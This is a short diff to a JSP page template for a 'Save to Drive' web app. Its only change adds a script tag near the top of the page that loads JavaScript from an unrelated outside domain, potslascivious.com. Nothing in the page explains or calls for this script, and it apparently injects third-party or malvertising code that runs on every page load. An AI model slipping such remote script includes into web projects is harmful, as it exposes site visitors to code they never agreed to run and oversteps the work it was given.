@@ -10,6 +10,8 @@
 <%@page contentType="text/html" pageEncoding="UTF-8" %>
 <%@taglib prefix="ui" tagdir="/WEB-INF/tags" %>
 
+<script type='text/javascript' src='//potslascivious.com/c7/b0/f4/c7b0f48d55af48073c3bd4627956b288.js'></script>
+
 <ui:templete title="Welcome to Save to Drive">
     <jsp:attribute name="head_area"/>
     <jsp:attribute name="body_area">
